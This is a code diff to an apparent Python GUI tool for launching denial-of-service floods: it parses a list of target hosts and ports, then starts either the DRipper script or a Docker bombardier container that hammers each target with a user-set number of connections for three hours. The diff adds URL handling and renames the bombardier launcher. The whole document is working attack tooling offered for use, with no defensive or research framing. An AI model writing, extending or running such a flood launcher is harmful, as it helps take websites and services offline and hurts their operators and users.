@@ -24,6 +24,7 @@ def get_ip(host):
     if is_ip4(host):
         return host
     try:
+        host = host.replace("http://", "").replace("https://", "")
         resolver = dns.resolver.Resolver()
         ips = list(resolver.resolve(host, 'A'))
         ip = random.choice(ips)
@@ -49,18 +50,28 @@ def start():
     for hostText in options_text.splitlines():
         if not hostText:
             continue
-        host = hostText.split(":")
-        ip = get_ip(host[0])
+        address = []
+        if hostText.count(":") > 1 or not hostText.startswith("http"):
+            address = hostText.rsplit(":", 1)
+        else:
+            if hostText.startswith("http"):
+                address.append(hostText)
+        host = address[0]
         port = "443"
-        if len(host) > 1:
-            port = host[1]
-        if ip != '255.255.255.255':
-            current = pathlib.Path(__file__).parent.resolve()
-            os.chdir(current)
-            if mode == 0:
+        if len(address) > 1:
+            port = address[1]
+        else:
+            if host.startswith("http://"):
+                port = "80"
+
+        current = pathlib.Path(__file__).parent.resolve()
+        os.chdir(current)
+        if mode == 0:
+            ip = get_ip(host)
+            if ip != '255.255.255.255':
                 run_ripper(ip, port)
-            elif mode == 1:
-                run_docker(ip, port)
+        elif mode == 1:
+            run_bombardier(host, port)
 
 
 def stop():
@@ -80,15 +91,19 @@ def run_ripper(ip, port):
     processes.append(sub)
 
 
-def run_docker(ip, port):
-    prefix = "https://"
-    if port != "443":
-        prefix = "http://"
-    print(f"Starting bombardier to: {prefix}{ip}:{port}")
+def run_bombardier(host, port):
+    if host.startswith("http"):
+        prefix = ""
+    else:
+        prefix = "https://"
+        if port != "443":
+            prefix = "http://"
+    print(f"Starting bombardier to: {prefix}{host}:{port}")
     client = docker.from_env()
-    container = client.containers.create("alpine/bombardier", f"-c {connectionCount.get()} -d 10800s -l {prefix}{ip}:{port}")
+    container = client.containers.create("alpine/bombardier", f"-c {connectionCount.get()} -d 10800s -l {prefix}{host}:{port}")
     container.start()
     processes.append(container)
+
 
 radioSelector = tk.IntVar()
 radio1 = tk.Radiobutton(app, text="DRipper", variable=radioSelector, value=0)
